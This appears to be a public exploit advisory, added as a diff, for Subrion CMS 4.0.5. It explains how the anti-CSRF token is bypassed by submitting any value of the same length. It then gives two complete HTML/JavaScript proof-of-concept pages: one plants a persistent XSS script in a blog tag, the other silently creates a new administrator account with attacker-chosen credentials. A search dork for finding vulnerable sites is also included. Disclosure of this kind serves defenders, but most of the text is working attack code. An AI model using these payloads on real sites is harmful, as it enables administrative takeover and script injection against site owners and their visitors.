@@ -1,0 +1,249 @@
+# Exploit Title: Subrion CMS 4.0.5 - CSRF Bypass to Persistent XSS and Add-Admin
+# Date: 15-10-2016
+# Software Link: http://www.subrion.org/download/
+# Vendor: http://www.subrion.org
+# Google Dork: "Powered by Subrion CMS"
+# Exploit Author: Ahsan Tahir
+# Contact: https://twitter.com/AhsanTahirAT | https://facebook.com/ahsantahiratofficial
+# Website: www.ahsantahir.net
+# Category: webapps
+# Version: 4.0.5
+# Tested on: [Kali Linux 2.0 | Windows 8.1]
+# Email: mrahsan1337@gmail.com
+
+[+] CSRF bypass to Persistent XSS
+
+1. Description
+
+There was an Anti-CSRF token while adding a post in Subrion CMS v4.0.5, named with paramater '__st', but it can be bypassed if we enter 
+the same number of characters in the CSRF token (for e.g XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX), then the CSRF protection will be bypassed
+means, if we craft a malicious HTML web page, we can trick the admin/vicitm to visit a website, and after he/she visits the website, 
+a blog post will be created with a tag like this: "</title><script>alert(document.domain);</script>" and now the XSS can be executed 
+here: http://localhost/[SubrionPATH]/tag/title-script-alert-document-domain-script/
+
+2. Proof of Concept (CSRF to Persistent XSS)
+
+Login to your subrion CMS as admin, visit a webpage with the below HTML code, and click on submit request, a new post named 
+"Hacked by Ahsan" will be created, with a tag "</title><script>alert(document.domain);</script>", means that we exploited
+CSRF sucessfully!
+
+XSS will execute here: http://localhost/[SubrionPATH]/tag/title-script-alert-document-domain-script/
+
+[!] PoC Code:
+
+<html>
+  <!-- CSRF PoC -->
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost/subi/admin/blog/add/", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------292766351574");
+        xhr.withCredentials = true;
+        var body = "-----------------------------292766351574\r\n" + 
+          "Content-Disposition: form-data; name=\"__st\"\r\n" + 
+          "\r\n" + 
+          "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\r\n" + 
+          "-----------------------------292766351574\r\n" + 
+          "Content-Disposition: form-data; name=\"title\"\r\n" + 
+          "\r\n" + 
+          "Hacked by Ahsan Tahir\r\n" + 
+          "-----------------------------292766351574\r\n" + 
+          "Content-Disposition: form-data; name=\"alias\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------292766351574\r\n" + 
+          "Content-Disposition: form-data; name=\"body\"\r\n" + 
+          "\r\n" + 
+          "\x3cp\x3eHacked by Ahsan Tahir\x3c/p\x3e\r\n" + 
+          "\r\n" + 
+          "-----------------------------292766351574\r\n" + 
+          "Content-Disposition: form-data; name=\"tags\"\r\n" + 
+          "\r\n" + 
+          "\x3c/title\x3e\x3cscript\x3ealert(document.domain);\x3c/script\x3e\r\n" + 
+          "-----------------------------292766351574\r\n" + 
+          "Content-Disposition: form-data; name=\"v[image]\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------292766351574\r\n" + 
+          "Content-Disposition: form-data; name=\"image\"; filename=\"\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------292766351574\r\n" + 
+          "Content-Disposition: form-data; name=\"owner\"\r\n" + 
+          "\r\n" + 
+          "Administrator (emailofadmin@gmail.com)\r\n" + 
+          "-----------------------------292766351574\r\n" + 
+          "Content-Disposition: form-data; name=\"member_id\"\r\n" + 
+          "\r\n" + 
+          "1\r\n" + 
+          "-----------------------------292766351574\r\n" + 
+          "Content-Disposition: form-data; name=\"date_added\"\r\n" + 
+          "\r\n" + 
+          "2016-10-15 04:41\r\n" + 
+          "-----------------------------292766351574\r\n" + 
+          "Content-Disposition: form-data; name=\"status\"\r\n" + 
+          "\r\n" + 
+          "active\r\n" + 
+          "-----------------------------292766351574\r\n" + 
+          "Content-Disposition: form-data; name=\"save\"\r\n" + 
+          "\r\n" + 
+          "Add\r\n" + 
+          "-----------------------------292766351574\r\n" + 
+          "Content-Disposition: form-data; name=\"goto\"\r\n" + 
+          "\r\n" + 
+          "list\r\n" + 
+          "-----------------------------292766351574--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
+----------------------------------------------------------------------------------------------------------------------
+
+[+] Add-Admin CSRF
+
+1. Description
+
+There was an Anti-CSRF token while adding an admin in Subrion CMS v4.0.5, named with paramater '__st', but it can be bypassed if we enter 
+the same number of characters in the CSRF token (for e.g XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX), then the CSRF protection will be bypassed
+means, if we craft a malicious HTML web page, we can trick the admin/vicitm to visit a website, and after he/she visits the website, 
+a new admin will be created with an email which is controled by attacker, means now the attacker have full administration over the
+Subrion CMS Blog!
+
+2. Proof of Concept
+
+Login to your subrion CMS as admin, visit a webpage with the below HTML code, and click on submit request, a new admin named 
+"Haxor" will be created, with email "ahsan@ahsan.py", means that we exploited the CSRF sucessfully, and now the attacker
+has full control over the subrion blog! 
+
+[!] PoC Code:
+
+<html>
+  <!-- CSRF PoC -->
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost/subi/admin/members/add/", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------2573679013209");
+        xhr.withCredentials = true;
+        var body = "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"__st\"\r\n" + 
+          "\r\n" + 
+          "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"username\"\r\n" + 
+          "\r\n" + 
+          "haxor\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"fullname\"\r\n" + 
+          "\r\n" + 
+          "Craxor\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"email\"\r\n" + 
+          "\r\n" + 
+          "ahsan@ahsan.py\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"_password\"\r\n" + 
+          "\r\n" + 
+          "ahsan123\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"_password2\"\r\n" + 
+          "\r\n" + 
+          "ahsan123\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"usergroup_id\"\r\n" + 
+          "\r\n" + 
+          "1\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"v[avatar[]]\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"avatar[]\"; filename=\"\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"website\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"phone\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"biography\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"facebook\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"twitter\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"gplus\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"linkedin\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"sponsored\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"featured\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"featured_end\"\r\n" + 
+          "\r\n" + 
+          "2016-11-15 04:54\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"status\"\r\n" + 
+          "\r\n" + 
+          "active\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"save\"\r\n" + 
+          "\r\n" + 
+          "Add\r\n" + 
+          "-----------------------------2573679013209\r\n" + 
+          "Content-Disposition: form-data; name=\"goto\"\r\n" + 
+          "\r\n" + 
+          "list\r\n" + 
+          "-----------------------------2573679013209--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
+Credits & Authors:
+==================
+Ahsan Tahir - [https://twitter.com/AhsanTahirAT]
